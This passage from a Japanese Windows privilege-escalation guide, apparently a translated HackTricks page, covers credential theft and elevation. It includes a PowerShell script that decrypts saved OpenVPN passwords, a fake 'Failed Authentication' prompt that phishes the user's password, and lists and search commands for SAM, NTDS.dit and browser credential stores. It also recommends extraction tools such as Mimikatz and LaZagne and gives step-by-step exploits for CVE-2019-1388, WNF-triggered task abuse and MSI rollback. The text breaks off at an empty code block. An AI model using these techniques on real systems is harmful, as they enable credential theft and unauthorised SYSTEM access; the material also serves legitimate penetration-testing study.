Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

アーカイブの名前だけでは、秘密情報が含まれていることも、回収した認証情報でより高い権限が得られることも証明できません。

### OpenVPN 認証情報

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### ログ

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### 認証情報を尋ねる

ユーザーが知っている可能性があると思うなら、**ユーザー自身の認証情報、あるいは別のユーザーの認証情報を入力するよう、いつでも尋ねることができます**（クライアントに**認証情報**を直接尋ねるのは、非常に**リスクが高い**ことに注意してください）：

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **認証情報を含む可能性のあるファイル名**

以前、**パスワード**が**平文**または**Base64**で含まれていたことが確認されているファイル

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Password Safe拡張子なしのファイル名リスト版

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 のデータベースでは、一般的に `.psafe3` 拡張子が使われます。一致するファイル名は暗号化された vault の候補として扱ってください。そのファイルが存在していても、読み取り、ロック解除、保存された認証情報の使用が可能であるとは限りません。こうしたファイルの保存場所を確認する際は、アクセス可能なユーザープロファイルと設定済みのファイル共有ルートを調べてください。

読み取り可能な KeePass `.kdbx` も、暗号化された vault の手掛かりにすぎません。ロック解除には、実際のマスターパスワードに加え、設定されているキーファイルやアカウント要素が必要です。許可を得た調査で、エントリに LM:NT ハッシュペアが見つかった場合は、[pass-the-hash](../ntlm/README.md#pass-the-hash) を検討する前に、記載されたアカウントと、NT ハッシュが現在も有効で対象の NTLM サービスに受け入れられるかを確認してください。vault のエントリだけで Administrator または SYSTEM の権限が得られるわけではありません。リモートサービスへのアクセス、アカウント権限、別途必要となるサービス実行の手順も満たす必要があります。インベントリには vault のパスと読み取り可否を記録し、データベースや保存された認証情報は出力しないでください。

提案されたファイルをすべて検索してください:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Password Safe 拡張機能を使用しない検索コマンドのバリエーション

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### ごみ箱内の認証情報

認証情報を探すため、ごみ箱も確認してください。

アクセス可能なごみ箱のエントリを確認し、削除されたバックアップや設定アーカイブに加えて、ファイル名に認証情報が明記されたファイルも探してください。有用な `.7z`、`.zip`、`.rar` バックアップは、数か月前のもので、ありふれたファイル名が付いていることもあります。Windows は元のパスと削除時刻を `$I` レコードに保存し、削除されたファイルを対になる `$R` エントリとして保存します。アーカイブを開く前に、メタデータと現在の ID による読み取りアクセス権を確認してください。表示される内容はボリューム、ユーザー SID、ファイルのアクセス許可によって異なるため、一覧が空でも、復元可能なバックアップが存在しないとは限りません。アーカイブ名は確認候補であり、有効な秘密情報が含まれている証拠ではありません。

アクセス可能な削除済み `.pfx` ファイルは、**コード署名**の手がかりにもなります。アクセス可能な秘密鍵が含まれていれば、その鍵で変更した PowerShell スクリプトに署名できます。[PowerShell では秘密鍵を持つコード署名証明書が必要です](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature)。また、[AppLocker の発行元ルールは署名者の ID とルールの適用範囲を評価します](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker)。別アカウントで実行するには、現在の ID によって対象のスクリプトそのものを変更できること、スクリプトと実行対象のアカウントに対して有効なルールが変更後の署名を許可すること、そしてスケジュールされたタスクなどの高い権限を持つ実行主体が実際にそのスクリプトを実行することが必要です。`.pfx` というファイル名、証明書のサブジェクト、または書き込み可能なスクリプトだけでは、一連の条件が成立する証拠にはなりません。秘密鍵を開いたりタスクを実行したりする前に、メタデータ、ACL、ポリシー、スケジュールされたコマンドを確認してください。

アクセス可能なメッセージングクライアントのプロファイルデータベース、メモ、受信ファイルも確認し、認証情報につながる手がかりを探してください。BitLocker 回復キーのエクスポートは HTML や TXT として保存されていることがあり、名前の付いたバックアップアーカイブに含まれている場合もあります。こうしたデータから、古いバックアップが保存された別の暗号化データボリュームにアクセスできる可能性があります。アクセスが許可されている場合に限り、ボリュームとアーカイブを調査してください。バックアップに `NTDS.dit` が含まれている場合、オフラインでドメイン認証情報を復元するには、[バックアップと特権グループのワークフロー](../active-directory-methodology/privileged-groups-and-token-privileges.md)の説明にあるように、対応する `SYSTEM` ハイブも必要です。ファイル名やロックされたボリュームだけでは、利用可能な回復キーやドメインバックアップが存在する証拠にはなりません。

複数のプログラムに保存された**パスワードを復元する**には、次を使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**認証情報を含む可能性があるその他のレジストリキー**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**レジストリから openssh keys を抽出する。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザーの履歴

**Chrome または Firefox** のパスワードが保存されているデータベースを確認してください。\
**Chrome、Edge、または Firefox** のパスワードが保存されているデータベースを確認してください。\
また、ブラウザーの履歴、ブックマーク、お気に入りも確認してください。そこに**パスワードが保存されている**可能性があります。

現在のユーザーの標準的な Edge **Default** プロファイルでは、`Login Data` は `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` にあり、`Local State` はその親ディレクトリである `User Data` にあります。[Microsoft のドキュメント](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars)では既定のプロファイルの場所が説明されています。別のプロファイルや `UserDataDir` ポリシーによって、場所が変更されている場合があります。ファイルが存在することは、認証情報の保存場所を特定する手がかりにすぎません。ファイルを読み取れること、該当ユーザーの DPAPI コンテキストまたはその他の許可された key material が利用できること、保存されたログイン情報がより高い権限を持つアカウントのものかどうかを確認してください。パスのみの列挙であれば、データベースを開いたり、復号したパスワードを表示したりする必要はありません。

Firefox については、[Mozilla のドキュメント](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile)によると、プロファイル内の `key4.db` と `logins.json` は、対になる key ファイルと暗号化されたログイン情報のファイルです。これらのファイルが存在することは手がかりにすぎません。両方のファイルを読み取れるか、保存されたエントリがあるか、認証情報を利用可能と判断する前に Primary Password が key を保護しているかを確認してください。復元した認証情報がドメインアカウントのものなら、そのアカウントの実効的なグループ制御権限と、グループの [LAPS password の読み取り権限または復号権限](../active-directory-methodology/laps.md)を別々に確認してください。ブラウザーの痕跡だけでは、管理者権限への経路があるとは判断できません。

ブラウザーからパスワードを抽出するツール:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は Windows オペレーティングシステムに組み込まれた技術で、異なる言語で開発されたソフトウェアコンポーネント間の**相互通信**を可能にします。各 COM コンポーネントは **class ID (CLSID)** で**識別され**、各コンポーネントは1つ以上のインターフェースを通じて機能を提供します。インターフェースは interface ID (IID) で識別されます。

COM クラスとインターフェースは、それぞれレジストリの **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** に定義されています。このレジストリは、**HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** をマージして作成されます。

このレジストリの CLSID 内には、子レジストリ **InProcServer32** があります。ここには、**DLL** を指す**既定値**と、**Apartment** (Single-Threaded)、**Free** (Multi-Threaded)、**Both** (Single or Multi)、または **Neutral** (Thread Neutral) を指定できる **ThreadingModel** という値が含まれています。

![ブラウザーの履歴 - COM DLL Overwriting: このレジストリの CLSID 内には、子レジストリ InProcServer32 があります。ここには、DLL を指す既定値と、値...](<../../images/image (729).png>)

基本的に、実行される DLL を**上書き**できれば、その DLL が別のユーザーによって実行される場合に**権限昇格**できる可能性があります。

攻撃者が永続化の手段として COM Hijacking をどのように利用するかについては、以下を参照してください:


{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイルとレジストリ内の一般的なパスワード検索**

**ファイルの内容を検索する**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**特定のファイル名のファイルを検索する**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**レジストリでキー名とパスワードを検索する**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) は、私が作成した **msf** プラグインです。被害者内の認証情報を検索するすべての Metasploit POST module を**自動的に実行**します。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページで紹介している、パスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) も、システムからパスワードを抽出する優れたツールです。

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、データを平文で保存する複数のツール（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の **sessions**、**usernames**、**passwords** を検索します。

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

SYSTEM として実行中のプロセスが、**フルアクセス権限で新しいプロセスを開く**（`OpenProcess()`）とします。同じプロセスが、**メインプロセスのすべてのオープンハンドルを継承する、低い権限で実行される新しいプロセスも作成します**（`CreateProcess()`）。\
その後、**低い権限のプロセスにフルアクセスできる場合**、`OpenProcess()` で作成された**特権プロセスへのオープンハンドル**を取得し、**shellcode をインジェクト**できます。\
[この脆弱性の**検出方法と悪用方法**について、詳しくはこの例を参照してください。](leaked-handle-exploitation.md)\
[プロセスやスレッドが継承した、さまざまな権限レベル（フルアクセスに限らない）のオープンハンドルをテストして悪用する方法について、より詳しく解説した**こちらの別の投稿**も参照してください。](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**パイプ**と呼ばれる共有メモリセグメントを使うと、プロセス間で通信やデータ転送ができます。

Windows には **Named Pipes** という機能があり、異なるネットワーク上にある場合でも、互いに無関係なプロセス間でデータを共有できます。これはクライアント／サーバーアーキテクチャに似ており、**named pipe server** と **named pipe client** という役割があります。

**クライアント**がパイプを通じてデータを送信すると、パイプを設定した**サーバー**は、必要な **SeImpersonate** 権限があれば、その**クライアントになりすます**ことができます。模倣可能なパイプを介して通信する**特権プロセス**を見つければ、自分が設定したパイプとそのプロセスがやり取りした際に、そのプロセスになりすまして**より高い権限を取得**できる可能性があります。この攻撃の実行方法については、[**こちら**](named-pipe-client-impersonation.md)と[**こちら**](#from-high-integrity-to-system)にあるガイドが参考になります。

また、次のツールを使うと、burp のようなツールで **named pipe の通信を傍受できます:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept)。さらに、このツールを使うと、すべてのパイプを一覧表示して確認し、privescs を探せます。 [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony サービス（TapiSrv）は、サーバーモードで `\\pipe\\tapsrv`（MS-TRP）を公開します。リモート認証済みクライアントは、mailslot ベースの非同期イベント処理経路を悪用して、`ClientAttach` を、`NETWORK SERVICE` が書き込み可能な既存ファイルへの任意の **4-byte write** に変えることができます。その後、Telephony の管理者権限を取得し、サービスとして任意の DLL をロードします。手順の全体像は次のとおりです。

- `pszDomainUser` に書き込み可能な既存のパスを設定して `ClientAttach` を実行すると、サービスは `CreateFileW(..., OPEN_EXISTING)` でそのファイルを開き、非同期イベントの書き込みに使用します。
- 各イベントは、`Initialize` で設定された攻撃者制御の `InitContext` を、そのハンドルに書き込みます。`LRegisterRequestRecipient`（`Req_Func 61`）で line app を登録し、`TRequestMakeCall`（`Req_Func 121`）をトリガーしてから、`GetAsyncEvents`（`Req_Func 0`）で取得します。その後、登録解除／シャットダウンを行い、決定的な書き込みを繰り返します。
- `C:\Windows\TAPI\tsec.ini` の `[TapiAdministrators]` に自分を追加して再接続し、任意の DLL パスを指定して `GetUIDllName` を呼び出すと、`NETWORK SERVICE` として `TSPI_providerUIIdentify` が実行されます。

詳細:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## その他

### Windows で実行される可能性があるファイル拡張子

**[https://filesec.io/](https://filesec.io/)** を確認してください。

### Markdown レンダラーを介した Protocol handler / ShellExecute の悪用

`ShellExecuteExW` に渡されるクリック可能な Markdown リンクは、危険な URI handler（`file:`、`ms-appinstaller:`、または登録済みの任意の scheme）を起動し、現在のユーザーとして攻撃者が制御するファイルを実行する可能性があります。詳細:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **パスワードを探すためのコマンドライン監視**

ユーザーとして shell を取得したとき、**コマンドラインで認証情報を渡す**スケジュールタスクやその他のプロセスが実行されている場合があります。以下のスクリプトは、2 秒ごとにプロセスのコマンドラインを取得し、現在の状態と前回の状態を比較して、差分を出力します。

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## プロセスからパスワードを窃取する

## 低権限ユーザーから NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェース（コンソールまたは RDP 経由）にアクセスでき、UAC が有効になっている場合、Microsoft Windows の一部のバージョンでは、権限のないユーザーから「NT\AUTHORITY SYSTEM」としてターミナルやその他のプロセスを実行できます。

これにより、同じ脆弱性を利用して、権限昇格と UAC Bypass を同時に実行できます。また、何もインストールする必要はなく、処理中に使用されるバイナリは Microsoft によって署名・発行されています。

影響を受けるシステムの例を以下に示します。

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

この脆弱性を悪用するには、以下の手順を実行する必要があります:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

GitHub リポジトリに、必要なファイルと情報がすべてあります。

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium から High Integrity Level への昇格 / UAC Bypass

**Integrity Levels**について学ぶには、こちらを読んでください。


{{#ref}}
integrity-levels.md
{{#endref}}

次に、**UAC と UAC bypasses**について学ぶには、こちらを読んでください。


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Web 配信ルート内への Upload Directory Junctions

アプリケーションが予測可能なアップロード用サブディレクトリを作成し、呼び出し元が指定したファイル名でそこに書き込み、その後ファイルを処理する場合があります。サーバー側の書き込みより前に、低権限ユーザーがそのサブディレクトリを削除し、NTFS junction に置き換えられると、書き込みが junction をたどって Web 配信ディレクトリに到達する可能性があります。サーバーがそのファイル形式を実行する場合、そこに配置したスクリプトは Web サービスの実行主体として実行される可能性があります。これはアプリケーション固有の任意書き込み境界です。アップロードディレクトリが書き込み可能であることや、junction が既に存在することだけでは、脆弱性の証明にはなりません。

アップロードハンドラーでの正確なパス構築と処理タイミング、サブディレクトリに対するユーザーの実効的な削除・作成権限、宛先の実効 ACL、書き込み処理が reparse point をたどるかどうか、そして Web サーバーが宛先でファイルを実行するかどうかを確認してください。書き込み処理と Web サーバーのプロセス ID は、それぞれ個別に確認してください。受動的なインベントリでディレクトリ ACL や reparse メタデータは確認できますが、ハンドラーの動作や将来の junction の差し替えまでは確認できません。実行がサービスアカウントで行われる場合、別の token-privilege 経路を検討する前に、**実際のプロセストークン**を確認してください。

## WNF-triggered 特権 Scheduled Task のクリーンアップ

手動実行を拒否する scheduled task でも、非特権ユーザーが利用できるトリガーが存在する場合があります。特権タスクを監査するときは、XML をエクスポートし、タスクの DACL、principal、action に加えて、**すべての**トリガーを確認してください。特に、`WnfStateChangeTrigger` は Windows Notification Facility (WNF) の state を指定します。その保護可能な state への更新を現在のユーザーが公開できる場合、`<AllowStartOnDemand>false</AllowStartOnDemand>` であっても、ユーザーは設定された ID でタスクを間接的に起動できます。<sup>[[43]](#references)</sup>

たとえば Recall の `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` タスクは SYSTEM として実行され、標準ユーザーからの WNF state `7508BCA32C079E41` への更新を受け付け、Recall が無効な場合でも `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` を検査していました。<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

到達可能性をテストするには、`ntdll.dll` から `ZwUpdateWnfStateData` を解決し、8 バイトの state name に対して空の更新を送信して、戻りステータスをタスクの最終実行データまたは Procmon のアクティビティと照合します。以下の簡略化したプローブでは、Recall タスクの例で使用したバイト列を使っています。テスト対象のタスク用にエクスポートされたバイト列に置き換えてください。<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### 再帰的なクリーンアップを悪用した特権削除

有用なプリミティブはトリガー単体ではなく、攻撃者が制御するディレクトリを受け取る特権クリーンアップルーチンです。列挙から最終的な変更までの処理を追跡してください。プロファイル／セッションの検出、ワイルドカードで選択される子要素、`SHCreateItemFromParsingName`、`IFileOperation::DeleteItem` は、事前にチェックされたパス名が後で再帰的にたどられることを示す強い兆候です。子孫を信頼できるディレクトリハンドルに相対して開き、削除前に検証しない場合、攻撃者は列挙と使用の間に解決先を変更できます。<sup>[[43]](#references)</sup>

WNF トリガーを、後述する[oplock、junction、Object Manager symlink による置換](#from-folder-contents-delete-to-system-eop)と組み合わせます。oplock により、正規の子要素が選択された後にクリーンアップを一時停止させ、その間に書き込み可能な祖先を置き換えます。再開した特権削除は `\RPC Control` を経由して保護対象に解決されます。Recall の攻撃チェーンでは、これにより、文書化されている MSI rollback 手法に必要な `C:\Config.Msi` の SYSTEM による削除が実現しました。<sup>[[31]](#references)[[43]](#references)</sup>

### 入れ子の子孫による浅い reparse point 対策の回避

攻撃者が制御するルートとその直下の子要素だけを検証しても、パス名ベースの再帰削除は安全になりません。検証済みのオブジェクトは正規のままにし、junction/oplock による置換をその下の追加の子要素に移します。すると `IFileOperation::DeleteItem` は最終的に未検証の子孫に到達し、新しいターゲットをたどります。最初の Recall パッチで `UKP` と GUID 形式のディレクトリを検証しながら、従来の再帰削除処理を残したため、CVE-2026-20941 はまさにこの種の不完全な修正によって発生しました。<sup>[[43]](#references)</sup>

安全な方法は、**すべての子孫**を既に信頼できるディレクトリハンドルに相対して開き、最終的な解決先のパス／オブジェクトを取得して検証したうえで、その検証済みハンドルに削除 disposition を適用することです。プレフィックスを検証した後、パス名ベースの再帰削除に戻ってはいけません。パッチレビューでは、実際の呼び出し箇所で使われている構造体も確認してください。このケースでは、`NtCreateFile` における `OBJECT_ATTRIBUTES` を実行時に調べたところ、`RootDirectory` が null ではなく、相対名 `{GUID}\\secure_file.lock` が指定されていることが判明しました。これにより、2つ目の `FILE_DELETE_ON_CLOSE` プリミティブがあるように見せる誤解を招く逆コンパイル結果が否定されました。<sup>[[43]](#references)</sup>

## 任意のフォルダー削除／移動／名前変更から SYSTEM EoP へ

この手法は、[**このブログ記事**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)で説明されており、exploit code は[**こちらから入手できます**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)。<sup>[[31]](#references)[[32]](#references)</sup>

この攻撃は基本的に、Windows Installer の rollback 機能を悪用し、アンインストール処理中に正規のファイルを悪意のあるファイルに置き換えます。そのために、攻撃者は `C:\Config.Msi` フォルダーを乗っ取るための**悪意のある MSI installer**を作成します。このフォルダーは後に Windows Installer によって他の MSI パッケージのアンインストール中に rollback ファイルを保存するために使われます。その rollback ファイルは、悪意のある payload を含むように改変されます。

### Windows Installer COM クリーンアップパスへの注入（CVE-2025-27727）

低権限のクライアントは、`CMsiConfigurationManager` COM オブジェクト（CLSID/IID `{000C101C-0000-0000-C000-000000000046}`）を通じて、SYSTEM として動作する `msiexec.exe` サービスに到達できます。リバースエンジニアリングにより、関連する `IMsiServer` 呼び出しは、vtable オフセット `0xA0` の `MsiBeginTransactionW`、`0xC8` の `SetEEUIDirectoryAndFilter`、`0x50` の `CleanupTempPackages` であることが特定されました。これらの名前とオフセットはリバースエンジニアリングによるもので、ビルドによって異なる場合があります。<sup>[[41]](#references)</sup>

非管理者の場合、`SetEEUIDirectoryAndFilter` は、指定されたパスを `DELETE`、`FILE_FLAG_BACKUP_SEMANTICS`、`FILE_FLAG_OPEN_REPARSE_POINT` を指定して開く間だけ呼び出し元を偽装します。これにより、呼び出し元がそのディレクトリを削除できることが確認され、reparse point をたどることも防止されます。しかし、チェック済みのファイルオブジェクトが後続のクリーンアップに引き継がれることは保証されず、Windows Installer がそのオブジェクトを作成したことも証明されません。<sup>[[41]](#references)</sup>

`MsiBeginTransactionW` の後、`SetEEUIDirectoryAndFilter` は呼び出し元の filter 引数にかかわらず、パスをフォルダーとして登録します。サービスは `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` の下に名前付き `REG_DWORD` 値を書き込みます。値の名前は呼び出し元が制御するパスで、データ `0x00000002` はフォルダーフラグです。その後、`CleanupTempPackages(NULL, FALSE)` がクリーンアップを直接開始します。昇格された worker はレジストリ値を列挙し、パスの出所を確認せずにフォルダーのエントリを再帰的な `FDeleteFolder` に渡します。通常の削除に失敗すると、コードは `LockdownPath` も呼び出し、ファイル属性をクリアして再試行します。<sup>[[41]](#references)</sup>

`msi.dll` から特定された最小限の呼び出しシーケンスは次のとおりです。<sup>[[41]](#references)</sup>

```c
